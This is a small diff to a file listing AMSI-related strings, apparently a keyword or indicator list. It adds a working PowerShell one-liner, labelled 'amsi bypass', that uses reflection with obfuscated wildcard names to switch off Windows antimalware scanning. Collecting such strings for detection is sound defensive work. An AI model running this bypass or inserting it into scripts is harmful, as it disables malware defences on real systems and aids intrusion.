@@ -11,3 +11,6 @@ AmsiUninitialize
 # registry key
 HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable
 
+# amsi bypass
+$items =[Ref].Assembly.GetTypes() | Where-Object {$_.Name -like "*siUt*"}; $item = $items.GetFields("NonPublic,Static") | Where-Object {$_.Name -like "*itFai*"}; $item.SetValue($null, $true)
+
